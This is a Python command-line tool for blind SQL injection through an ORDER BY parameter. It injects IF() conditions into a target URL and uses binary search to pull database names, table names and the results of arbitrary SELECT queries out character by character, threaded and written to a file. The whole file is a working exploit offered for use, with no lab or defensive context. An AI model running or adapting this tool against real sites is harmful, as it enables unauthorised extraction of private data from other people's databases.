import argparse
import requests
from concurrent.futures import ThreadPoolExecutor
import threading
import queue

write_lock = threading.Lock()

# --- Injection engine helpers ---
def send_payload(payload):
    injected = url.replace(replacer, f"IF({payload},{collname},0)")
    r = requests.get(injected, headers=custom_headers)
    return clean(truestring) in clean(r.text)

def clean(s):
    return s.replace(" ", "").replace("\n", "").replace("\t", "")

# --- Exact ASCII Binary Search ---
def get_char_code(i, j, query_template, low=32, high=126):
    def leq(x):
        payload = f"({query_template.replace('${i}', str(i)).replace('${j}', str(j))}) <= {x}"
        return send_payload(payload)

    while low < high:
        mid = (low + high) // 2
        if leq(mid):
            high = mid
        else:
            low = mid + 1
    return low if 32 <= low <= 126 else -1  # fallback if out of range

# --- Binary Search with fail-safe ---
def binary_search(low, high, condition_func, max_depth=None):
    if max_depth is None:
        # Dynamically set max_depth based on the range (log2 of the range)
        max_depth = int((high - low).bit_length()) + 1

    depth = 0
    while low < high and depth < max_depth:
        mid = (low + high) // 2
        if condition_func(mid):
            high = mid
        else:
            low = mid + 1
        depth += 1
    return low if depth < max_depth else -1

# --- Dump logic ---
def dump():
    print("[I] Starting to dump")
    if args.sql_query:
        cquery()
        return

    if wish == 1:
        dump_dbs()
    elif wish == 2:
        dump_tables()
    elif wish == 3:
        cquery()

def dump_dbs():
    print("[+] Discovering number of databases...")
    db_count = -1
    for i in range(1, 101):
        if send_payload(f"{i}=({queries['db_count']})"):
            db_count = i
            print(f"[I] Found: {db_count} DBs")
            break
    if db_count == -1:
        print("[-] Couldn't determine DB count.")
        return

    for i in range(db_count):
        print(f"[+] Dumping DB index {i}")

        def length_cond(x):
            return send_payload(f"{x}>({queries['db_name_length'].replace('${i}', str(i))})")
        db_len = binary_search(1, 100, length_cond)
        if db_len == -1:
            print(f"[-] Couldn't get DB length for index {i}")
            continue

        db_name = ""
        for j in range(1, db_len + 1):
            char_code = get_char_code(i, j, queries['db_name_char_ascii'])
            db_name += chr(char_code) if char_code != -1 else '?'
        print(f"[DB{i}] {db_name}")

def dump_tables():
    db = input("Enter the database name: ")
    print(f"[+] Getting table count in DB: {db}")
    count_query = queries['table_count'].replace('${db}', db)

    table_count = -1
    for i in range(1, 1001):
        if send_payload(f"{i}=({count_query})"):
            table_count = i
            print(f"[I] Found {table_count} tables in {db}")
            break
    if table_count == -1:
        print("[-] Could not determine table count")
        return

    for i in range(table_count):
        print(f"[+] Dumping table {i} name")
        len_query = queries['table_name_length'].replace('${db}', db).replace('${i}', str(i))
        def length_cond(x):
            return send_payload(f"{x}>({len_query})")
        name_len = binary_search(1, 100, length_cond)
        table_name = ""
        for j in range(1, name_len + 1):
            char_code = get_char_code(i, j, queries['table_name_char_ascii'].replace('${db}', db).replace('${i}', str(i)))
            table_name += chr(char_code) if char_code != -1 else '?'
        print(f"[TBL{i}] {table_name}")

# CQUERY V1.0 HAHA

#def cquery():
#    raw_query = input("Enter custom SELECT query returning 1 value: ")
#    print("[+] Estimating result length...")
#
#    def len_cond(x):
#        return send_payload(f"LENGTH(({raw_query})) < {x}")
#
#    result_len = binary_search(1, 100, len_cond)
#    if result_len == -1:
#        print("[-] Failed to get result length")
#        return
#
#    print(f"[+] Result length: {result_len}")
#    result = ""
#
#    for j in range(1, result_len + 1):
#        ascii_query = f"SELECT ORD(SUBSTRING(({raw_query}), {j}, 1))"
#        char_code = get_char_code(0, j, ascii_query, low=32, high=126)
#
#        if char_code == -1:
#            print(f"[!] Invalid char at pos {j}, using '?'")
#            result += '?'
#        else:
#            result += chr(char_code)
#
#    print(f"[+] Query Result: {result}")


## CQUERY MULTI RESULTS CONCATED


## def cquery():
##     raw_query = args.sql_query or input("Enter custom SELECT query returning 1 value: ")
##     output_file = args.output
## 
##     print("[+] Estimating result length...")
## 
##     # Wrap query to ensure it returns single string (col1,col2\nrow2,...)
## # Assuming raw_query is something like "SELECT 7" or "SELECT x, y FROM table"
## 
## # Split raw_query and extract column names or expressions (e.g., "x, y" part)
##     query_parts = raw_query.strip().split("FROM")[0]  # Get everything before 'FROM'
##     columns = query_parts.replace("SELECT", "").strip()  # Remove "SELECT" and trim spaces
##     
##     # Build the wrapped query using the extracted columns
##     wrapped_query = f"SELECT GROUP_CONCAT(CONCAT_WS(',', {columns}) SEPARATOR '\\n') FROM ({raw_query}) AS subq"
##     
##     def len_cond(x):
##         return send_payload(f"LENGTH(({wrapped_query})) < {x}")
##     
##     result_len = binary_search(1, 10000, len_cond)
##     if result_len == -1:
##         print("[-] Failed to get result length")
##         return
## 
##     print(f"[+] Total length: {result_len}")
##     result_chars = [''] * result_len
## 
##     def dump_char(j):
##         ascii_query = f"SELECT ORD(SUBSTRING(({wrapped_query}), {j}, 1))"
##         char_code = get_char_code(0, j, ascii_query, low=32, high=126)
## 
##         ch = chr(char_code) if char_code != -1 else '?'
##         print(ch, end='', flush=True)
## 
##         if output_file:
##             with write_lock:
##                 with open(output_file, "a") as f:
##                     f.write(ch)
## 
##         result_chars[j - 1] = ch
## 
##     # Run all char jobs in parallel batches
##     with ThreadPoolExecutor(max_workers=threads) as executor:
##         for batch_start in range(1, result_len + 1, threads):
##             batch_end = min(batch_start + threads, result_len + 1)
##             executor.map(dump_char, range(batch_start, batch_end))
## 
##     print("\n[+] Done.")



# CQUERY final, multi + threaded
# Barrier will now use the dynamic `threads` parameter
def cquery():
    barrier = threading.Barrier(parties=args.threads)  # Threads per batch, based on the user input
    raw_query = args.sql_query or input("Enter custom SELECT query returning 1 value: ")
    output_file = args.output

    print("[+] Estimating result length...")

    # Wrap query to ensure it returns a single string (col1,col2\nrow2,...)
    query_parts = raw_query.strip().split("FROM")[0]  # Get everything before 'FROM'
    columns = query_parts.replace("SELECT", "").strip()  # Remove "SELECT" and trim spaces
    
    # Build the wrapped query using the extracted columns
    wrapped_query = f"SELECT GROUP_CONCAT(CONCAT_WS(',', {columns}) SEPARATOR '~') FROM ({raw_query}) AS subq"
    
    def len_cond(x):
        return send_payload(f"LENGTH(({wrapped_query})) < {x}")
    
    result_len = binary_search(1, 1000000, len_cond)
    if result_len == -1:
        print("[-] Failed to get result length")
        return

    print(f"[+] Total length: {result_len}")
    
    # Adjust result_len to be a multiple of threads for easier batching
    result_len = (result_len + args.threads - 1) // args.threads * args.threads
    print(f"[+] Adjusted result length for batching: {result_len}")

    # Result storage
    result = [""] * result_len
    all_results = []  # Store all results

    # Dumping function for each character
    def dump_char(j):
        # Avoid threads beyond the result length
        if j > result_len:
            return

        ascii_query = f"SELECT ORD(SUBSTRING(({wrapped_query}), {j}, 1))"
        char_code = get_char_code(0, j, ascii_query, low=32, high=126)

        # Check if the character is valid
        if char_code == -1:
            ch = '?'
        else:
            ch = chr(char_code)
        ch=ch.replace('~',"\n")  # BAD but temp solution for \n normal parse
        # Store the result in the correct position (index `j-1`)
        result[j-1] = ch

        # Wait for all threads in the batch to complete (synchronize the threads in batches)
        barrier.wait()

        # After a batch of threads (based on `threads`), print and flush results
        if j % args.threads == 0 or j == result_len:  # Flush after every 'threads' number of threads or last thread
            with write_lock:
                # Print the current batch without a newline
                batch_result = "".join(result[:j])  # Take the first j elements, which are the ordered ones
                print(batch_result, end='', flush=True)
                all_results.append(batch_result)  # Store the batch result for final output

            # Optionally, write to a file
            if output_file:
                with write_lock:
                    with open(output_file, "a") as f:
                        f.write(batch_result)

            # Clear the result for the next batch (avoiding merging results)
            result[:j] = [""] * j

    # Run threaded jobs in batches
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for j in range(1, result_len + 1):
            executor.submit(dump_char, j)

    # After all threads are done, flush the final result
    final_result = "".join(all_results)


    #with write_lock:
    #    print(final_result, end='', flush=True)

    # Optionally, write the final result to a file
    if output_file:
        with write_lock:
            with open(output_file, "a") as f:
                f.write(final_result)

    print("\n[+] Done.")



# --- CLI setup ---
parser = argparse.ArgumentParser(description="Blind SQLi Order Injection Tool")
parser.add_argument("--url", required=True, help="Target URL with INJ where injection happens")
parser.add_argument("--collname", required=True, help="Known column name used in ORDER BY")
parser.add_argument("--true-string", required=True, help="String that confirms condition is TRUE")
parser.add_argument("--headers", help="Optional headers as raw string")
parser.add_argument("--wish", type=int, choices=[1, 2, 3]) #, required=True)
parser.add_argument("--sql-query", help="Custom SQL SELECT query (overrides input())")
parser.add_argument("-o", "--output", help="Output file to write dumped result")

parser.add_argument("-t", "--threads", type=int, default=1, help="Number of threads for cquery")
args = parser.parse_args()
threads = args.threads

url = args.url
replacer = "INJ"
collname = args.collname
truestring = args.true_string
wish = args.wish

# Convert headers
custom_headers = {}
if args.headers:
    for line in args.headers.split(";"):
        if ":" in line:
            k, v = line.split(":", 1)
            custom_headers[k.strip()] = v.strip()

# --- Queries ---
queries = {
    "db_count": "SELECT COUNT(*) FROM information_schema.schemata",
    "db_name_length": "SELECT LENGTH((SELECT schema_name FROM information_schema.schemata LIMIT ${i},1))",
    "db_name_char_ascii": "SELECT ORD(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT ${i},1), ${j}, 1))",
    "table_count": "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = '${db}'",
    "table_name_length": "SELECT LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema = '${db}' LIMIT ${i},1))",
    "table_name_char_ascii": "SELECT ORD(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = '${db}' LIMIT ${i},1), ${j}, 1))",
    "column_count": "SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = '${db}' AND table_name = '${table}'",
    "column_name_length": "SELECT LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema = '${db}' AND table_name = '${table}' LIMIT ${i},1))",
    "column_name_char_ascii": "SELECT ORD(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema = '${db}' AND table_name = '${table}' LIMIT ${i},1), ${j}, 1))"
}

# --- Run ---
if __name__ == "__main__":
    try:
        if replacer in url:
            if send_payload("1=1"):
                print("[+] Injection seems to be working!")
                dump()
            else:
                print("[-] Injection test failed. Check true-string and injection point.")
        else:
            print(f"[-] URL is missing the placeholder '{replacer}' for injection.")
    except Exception as e:
        print(f"[!!] Error: {e}")
